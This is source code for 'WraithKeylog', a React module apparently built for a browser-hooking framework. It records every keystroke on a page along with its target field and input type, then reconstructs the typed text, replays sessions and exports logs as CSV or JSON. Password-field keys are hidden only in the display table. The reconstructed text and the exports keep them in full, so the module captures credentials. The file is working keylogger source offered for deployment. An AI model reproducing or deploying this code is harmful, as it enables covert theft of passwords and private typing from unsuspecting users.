/**
 * WraithKeylog — Keyboard Logger
 * Captures keystrokes. Live keyboard display, frequency heatmap, text reconstruction, replay, export.
 */

import { useState, useEffect, useRef, useMemo } from 'react'
import { Panel, StatCard, Button } from '@framework/ui'

// ── Keyboard layout ───────────────────────────────────────────────────────────
const KEYBOARD = [
  [
    {c:'Backquote',l:'`'},{c:'Digit1',l:'1'},{c:'Digit2',l:'2'},{c:'Digit3',l:'3'},
    {c:'Digit4',l:'4'},{c:'Digit5',l:'5'},{c:'Digit6',l:'6'},{c:'Digit7',l:'7'},
    {c:'Digit8',l:'8'},{c:'Digit9',l:'9'},{c:'Digit0',l:'0'},{c:'Minus',l:'-'},
    {c:'Equal',l:'='},{c:'Backspace',l:'⌫',w:2},
  ],
  [
    {c:'Tab',l:'Tab',w:1.5},{c:'KeyQ',l:'Q'},{c:'KeyW',l:'W'},{c:'KeyE',l:'E'},
    {c:'KeyR',l:'R'},{c:'KeyT',l:'T'},{c:'KeyY',l:'Y'},{c:'KeyU',l:'U'},
    {c:'KeyI',l:'I'},{c:'KeyO',l:'O'},{c:'KeyP',l:'P'},{c:'BracketLeft',l:'['},
    {c:'BracketRight',l:']'},{c:'Backslash',l:'\\',w:1.5},
  ],
  [
    {c:'CapsLock',l:'Caps',w:1.75},{c:'KeyA',l:'A'},{c:'KeyS',l:'S'},{c:'KeyD',l:'D'},
    {c:'KeyF',l:'F'},{c:'KeyG',l:'G'},{c:'KeyH',l:'H'},{c:'KeyJ',l:'J'},
    {c:'KeyK',l:'K'},{c:'KeyL',l:'L'},{c:'Semicolon',l:';'},{c:'Quote',l:"'"},
    {c:'Enter',l:'↩',w:2.25},
  ],
  [
    {c:'ShiftLeft',l:'Shift',w:2.25},{c:'KeyZ',l:'Z'},{c:'KeyX',l:'X'},{c:'KeyC',l:'C'},
    {c:'KeyV',l:'V'},{c:'KeyB',l:'B'},{c:'KeyN',l:'N'},{c:'KeyM',l:'M'},
    {c:'Comma',l:','},{c:'Period',l:'.'},{c:'Slash',l:'/'},{c:'ShiftRight',l:'Shift',w:2.75},
  ],
  [
    {c:'ControlLeft',l:'Ctrl',w:1.25},{c:'MetaLeft',l:'⌘',w:1.25},
    {c:'AltLeft',l:'Alt',w:1.25},{c:'Space',l:'',w:6.25},
    {c:'AltRight',l:'Alt',w:1.25},{c:'MetaRight',l:'⌘',w:1.25},
    {c:'ContextMenu',l:'☰',w:1.25},{c:'ControlRight',l:'Ctrl',w:1.25},
  ],
]

const KEY_UNIT = 36
const KEY_H    = 32
const KEY_GAP  = 3

function KeyCap({ c, l, w = 1, pressed, freq = 0, maxFreq = 0 }) {
  const norm = maxFreq > 0 ? freq / maxFreq : 0
  let bg, fg, border

  if (pressed) {
    bg = '#7c3aed'; fg = '#fff'; border = '#9f6fe8'
  } else if (norm > 0) {
    const r = Math.round(30 + norm * 205)
    const g = Math.round(20 - norm * 18)
    const b = Math.round(60 - norm * 55)
    bg = `rgb(${r},${g},${b})`
    fg = norm > 0.35 ? '#fff' : '#9ca3af'
    border = bg
  } else {
    bg = '#16161f'; fg = '#374151'; border = '#252535'
  }

  const px = KEY_UNIT * w + KEY_GAP * (w - 1)
  const label = l !== undefined ? l : c.replace(/^Key|^Digit/, '')

  return (
    <div
      style={{ width: px, height: KEY_H, background: bg, color: fg, borderColor: border, flexShrink: 0 }}
      className="flex items-center justify-center rounded border text-xs select-none transition-colors duration-75 overflow-hidden cursor-default"
      title={freq ? `${c}: ${freq}×` : c}
    >
      <span className="truncate px-0.5 leading-none">{label}</span>
    </div>
  )
}

function Keyboard({ pressedKeys = [], freq = {}, maxFreq = 0 }) {
  return (
    <div className="inline-flex flex-col overflow-x-auto" style={{ gap: KEY_GAP }}>
      {KEYBOARD.map((row, ri) => (
        <div key={ri} className="flex" style={{ gap: KEY_GAP }}>
          {row.map(k => (
            <KeyCap
              key={k.c}
              {...k}
              pressed={pressedKeys.includes(k.c)}
              freq={freq[k.c] ?? 0}
              maxFreq={maxFreq}
            />
          ))}
        </div>
      ))}
    </div>
  )
}

function fmt(ms) {
  return new Date(ms).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })
}

function fmtDuration(ms) {
  const s = Math.floor(ms / 1000)
  const m = Math.floor(s / 60)
  return m > 0 ? `${m}m ${s % 60}s` : `${s}s`
}

function reconstructText(keydownEvents) {
  let text = ''
  for (const e of keydownEvents) {
    const { key } = e.payload
    if (key === 'Backspace') { text = text.slice(0, -1); continue }
    if (key === 'Enter')     { text += '\n'; continue }
    if (key === 'Tab')       { text += '\t'; continue }
    if (key.length === 1)    text += key
  }
  return text
}

function downloadBlob(blob, filename) {
  const url = URL.createObjectURL(blob)
  const a = Object.assign(document.createElement('a'), { href: url, download: filename })
  a.click()
  URL.revokeObjectURL(url)
}

function exportCSV(events) {
  const header = 'key,code,alt,ctrl,shift,meta,repeat,tag,field_type,timestamp,time'
  const rows = events.map(e => {
    const p = e.payload
    const safeKey = /[,"\n]/.test(String(p.key)) ? `"${String(p.key).replace(/"/g, '""')}"` : p.key
    return `${safeKey},${p.code},${p.alt},${p.ctrl},${p.shift},${p.meta},${p.repeat},${p.tag ?? ''},${p.itype ?? ''},${p.t},"${fmt(p.t)}"`
  })
  downloadBlob(new Blob([[header, ...rows].join('\n')], { type: 'text/csv' }), `wraith-keylog-${Date.now()}.csv`)
}

function exportJSON(events) {
  const out = events.map(e => ({ ...e.payload, time: new Date(e.payload.t).toISOString() }))
  downloadBlob(new Blob([JSON.stringify(out, null, 2)], { type: 'application/json' }), `wraith-keylog-${Date.now()}.json`)
}

// ── Module export ─────────────────────────────────────────────────────────────

export default {
  id:          'wraith-keylog',
  name:        'Keylogger',
  version:     '1.0.0',
  author:      'tilmana',
  date:        '2026-04-19',
  description: 'Captures all keystrokes. Live keyboard, frequency heatmap, text reconstruction, replay, export.',
  permissions: ['keyboard_input'],

  capture: {
    events: [
      {
        event:   'keydown',
        persist: true,
        payload: e => ({
          key:    e.key,
          code:   e.code,
          alt:    e.altKey,
          ctrl:   e.ctrlKey,
          shift:  e.shiftKey,
          meta:   e.metaKey,
          repeat: e.repeat,
          tag:    e.target ? e.target.tagName.toLowerCase() : null,
          itype:  e.target && e.target.type ? e.target.type : null,
          t:      Date.now(),
        }),
      },
      {
        event:   'keyup',
        persist: true,
        payload: e => ({ code: e.code, t: Date.now() }),
      },
      {
        // Window blur fires when focus leaves the page (Tab to browser chrome, alt-tab, etc.)
        // keyup never fires in that case, so we clear all pressed keys to avoid stuck display.
        event:   'blur',
        persist: false,
        payload: () => ({ t: Date.now() }),
      },
    ],
  },

  live: (state, event) => {
    const s = state ?? { pressedKeys: [], totalStrokes: 0, recentKeys: [], keyFreq: {} }
    if (event.type === 'keydown') {
      const { code, key, repeat } = event.payload
      if (repeat) return s
      return {
        pressedKeys:  s.pressedKeys.includes(code) ? s.pressedKeys : [...s.pressedKeys, code],
        totalStrokes: s.totalStrokes + 1,
        recentKeys:   [...s.recentKeys.slice(-29), { key, code, t: event.timestamp }],
        keyFreq:      { ...s.keyFreq, [code]: (s.keyFreq[code] ?? 0) + 1 },
      }
    }
    if (event.type === 'keyup') {
      const { code } = event.payload
      return { ...s, pressedKeys: s.pressedKeys.filter(k => k !== code) }
    }
    if (event.type === 'blur') {
      return { ...s, pressedKeys: [] }
    }
    return s
  },

  ui: {
    nav: { label: 'Keylogger', icon: 'key' },

    panel: ({ live }) => {
      const pressed = live.pressedKeys ?? []
      const total   = live.totalStrokes ?? 0
      const recent  = live.recentKeys ?? []
      const recentStr = recent.slice(-12).map(k => k.key).join(' ')

      return (
        <Panel title="Keylogger">
          <div className="flex gap-2 flex-wrap">
            <StatCard label="Keystrokes" value={total} />
            <StatCard label="Keys held"  value={pressed.length} />
          </div>
          <div className="overflow-x-auto py-1">
            <Keyboard pressedKeys={pressed} />
          </div>
          {recentStr && (
            <p className="text-xs text-muted font-mono truncate" title={recentStr}>
              {recentStr}
            </p>
          )}
        </Panel>
      )
    },

    view: ({ data }) => {
      const allEvents = useMemo(() => data.events ?? [], [data.events])
      const keydowns  = useMemo(() => allEvents.filter(e => e.type === 'keydown'), [allEvents])

      // Frequency map (excludes held-key repeats)
      const { freq, maxFreq, topKeys } = useMemo(() => {
        const freq = {}
        let maxFreq = 0
        for (const e of keydowns) {
          if (e.payload.repeat) continue
          const code = e.payload.code
          freq[code] = (freq[code] ?? 0) + 1
          if (freq[code] > maxFreq) maxFreq = freq[code]
        }
        const topKeys = Object.entries(freq).sort((a, b) => b[1] - a[1]).slice(0, 8)
        return { freq, maxFreq, topKeys }
      }, [keydowns])

      // Timeline bounds
      const { minT, maxT } = useMemo(() => {
        const ts = allEvents.map(e => e.payload.t ?? e.timestamp).filter(Boolean)
        return ts.length
          ? { minT: Math.min(...ts), maxT: Math.max(...ts) }
          : { minT: 0, maxT: 0 }
      }, [allEvents])

      // Replay
      const [replayAt,  setReplayAt]  = useState(null)
      const [isPlaying, setIsPlaying] = useState(false)
      const snapRef = useRef(null)
      const inReplay   = replayAt !== null
      const snap       = inReplay ? snapRef.current : null
      const snapMinT   = snap?.minT ?? minT
      const snapMaxT   = snap?.maxT ?? maxT
      const cutoff     = replayAt ?? snapMaxT

      const replayPressed = useMemo(() => {
        if (!inReplay) return []
        const pressed = new Set()
        for (const e of (snap?.events ?? allEvents)) {
          const t = e.payload.t ?? e.timestamp
          if (t > cutoff) break
          if (e.type === 'keydown') pressed.add(e.payload.code)
          if (e.type === 'keyup')   pressed.delete(e.payload.code)
        }
        return Array.from(pressed)
      }, [inReplay, cutoff, snap])

      useEffect(() => {
        if (!isPlaying) return
        const id = setInterval(() => {
          setReplayAt(prev => {
            const next = (prev ?? snapMinT) + 100
            if (next >= snapMaxT) { setIsPlaying(false); return snapMaxT }
            return next
          })
        }, 100)
        return () => clearInterval(id)
      }, [isPlaying, snapMinT, snapMaxT])

      function enterReplay() {
        snapRef.current = { events: [...allEvents], minT, maxT }
        setReplayAt(minT)
        setIsPlaying(true)
      }
      function goLive() { snapRef.current = null; setReplayAt(null); setIsPlaying(false) }
      function scrub(v) {
        if (!inReplay) snapRef.current = { events: [...allEvents], minT, maxT }
        setIsPlaying(false)
        setReplayAt(v)
      }

      // Text reconstruction
      const reconstructed = useMemo(() => reconstructText(keydowns), [keydowns])

      // Copy
      const [copied, setCopied] = useState(false)
      function copyText() {
        navigator.clipboard?.writeText(reconstructed).then(() => {
          setCopied(true)
          setTimeout(() => setCopied(false), 1500)
        })
      }

      const uniqueCount  = Object.keys(freq).length
      const strokeCount  = keydowns.filter(e => !e.payload.repeat).length
      const duration     = maxT > minT ? maxT - minT : 0

      if (allEvents.length === 0) {
        return <p className="text-muted text-sm">no keystroke data yet</p>
      }

      return (
        <div className="space-y-6">

          {/* Stats */}
          <div className="flex gap-2 flex-wrap">
            <StatCard label="Keystrokes"  value={strokeCount} />
            <StatCard label="Unique keys" value={uniqueCount} />
            {topKeys[0] && (
              <StatCard label="Top key" value={`${topKeys[0][0].replace(/^Key|^Digit/, '')} (${topKeys[0][1]}×)`} />
            )}
            {duration > 0 && <StatCard label="Duration" value={fmtDuration(duration)} />}
          </div>

          {/* Keyboard + replay controls */}
          <div className="space-y-3">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-xs font-semibold uppercase tracking-widest text-muted">
                {inReplay ? `Replay · ${fmt(cutoff)}` : 'Key Frequency'}
              </span>
              {!inReplay ? (
                <button
                  onClick={enterReplay}
                  className="text-xs px-3 py-1 rounded border border-border text-muted hover:text-gray-200 transition-colors"
                >▶ Replay</button>
              ) : (
                <div className="flex items-center gap-1.5 flex-wrap">
                  <button
                    onClick={() => { setReplayAt(snapMinT); setIsPlaying(false) }}
                    className="text-xs px-2 py-1 rounded border border-border text-muted hover:text-gray-200"
                  >⏮</button>
                  <button
                    onClick={() => setIsPlaying(p => !p)}
                    className="text-xs px-2 py-1 rounded border border-border text-muted hover:text-gray-200 w-8 text-center"
                  >{isPlaying ? '⏸' : '▶'}</button>
                  <input
                    type="range"
                    min={snapMinT} max={snapMaxT} step={50}
                    value={cutoff}
                    onChange={e => scrub(Number(e.target.value))}
                    className="w-48 accent-accent"
                  />
                  <span className="text-xs text-muted tabular-nums">{fmt(cutoff)}</span>
                  <button
                    onClick={goLive}
                    className="text-xs px-2 py-1 rounded bg-accent text-white hover:opacity-90"
                  >↩ Live</button>
                </div>
              )}
            </div>

            <div className="overflow-x-auto">
              <Keyboard
                pressedKeys={inReplay ? replayPressed : []}
                freq={inReplay ? {} : freq}
                maxFreq={inReplay ? 0 : maxFreq}
              />
            </div>

            {/* Top keys chips */}
            {!inReplay && topKeys.length > 0 && (
              <div className="flex gap-1.5 flex-wrap">
                {topKeys.map(([code, count]) => (
                  <span
                    key={code}
                    className="text-xs rounded border border-border bg-surface px-2 py-1 text-muted"
                  >
                    <span className="text-gray-300 font-mono">{code.replace(/^Key|^Digit/, '')}</span>
                    <span className="ml-1">{count}×</span>
                  </span>
                ))}
              </div>
            )}
          </div>

          {/* Text reconstruction */}
          <div className="space-y-2">
            <div className="flex items-center gap-2">
              <span className="text-xs font-semibold uppercase tracking-widest text-muted">
                Reconstructed Text
              </span>
              <button
                onClick={copyText}
                disabled={!reconstructed}
                className="text-xs px-2 py-0.5 rounded border border-border text-muted hover:text-gray-200 transition-colors disabled:opacity-40"
              >{copied ? 'Copied!' : 'Copy'}</button>
            </div>
            <pre className="rounded border border-border bg-surface p-3 text-xs text-gray-300 font-mono whitespace-pre-wrap break-all max-h-40 overflow-y-auto">
              {reconstructed || '(nothing printable captured yet)'}
            </pre>
          </div>

          {/* Event log */}
          <div className="space-y-2">
            <span className="text-xs font-semibold uppercase tracking-widest text-muted">
              Keystroke Log ({strokeCount} events)
            </span>
            <div className="rounded border border-border bg-surface overflow-hidden">
              <div className="max-h-64 overflow-y-auto">
                <table className="w-full text-xs">
                  <thead className="sticky top-0 bg-panel border-b border-border z-10">
                    <tr>
                      {['Time', 'Key', 'Code', 'Modifiers', 'Target'].map(h => (
                        <th key={h} className="px-3 py-2 text-left text-muted font-medium whitespace-nowrap">{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-border">
                    {keydowns.filter(e => !e.payload.repeat).slice().reverse().map((e, i) => {
                      const p    = e.payload
                      const mods = [p.ctrl && 'Ctrl', p.alt && 'Alt', p.shift && 'Shift', p.meta && '⌘'].filter(Boolean).join('+')
                      const isPassword = p.itype === 'password'
                      return (
                        <tr key={i} className="hover:bg-surface/60">
                          <td className="px-3 py-1.5 text-muted tabular-nums whitespace-nowrap">{fmt(p.t)}</td>
                          <td className="px-3 py-1.5 font-mono text-gray-100">{isPassword ? '•' : p.key}</td>
                          <td className="px-3 py-1.5 font-mono text-muted">{p.code}</td>
                          <td className="px-3 py-1.5 text-muted">{mods || '—'}</td>
                          <td className="px-3 py-1.5 text-muted">
                            {p.tag ? `${p.tag}${p.itype ? `[${p.itype}]` : ''}` : '—'}
                          </td>
                        </tr>
                      )
                    })}
                  </tbody>
                </table>
              </div>
            </div>
          </div>

          {/* Export */}
          <div className="space-y-2">
            <span className="text-xs font-semibold uppercase tracking-widest text-muted">Export</span>
            <div className="flex gap-2">
              <Button label="Export CSV"  onClick={() => exportCSV(keydowns.filter(e => !e.payload.repeat))} variant="ghost" />
              <Button label="Export JSON" onClick={() => exportJSON(keydowns.filter(e => !e.payload.repeat))} variant="ghost" />
            </div>
          </div>

        </div>
      )
    },
  },
}
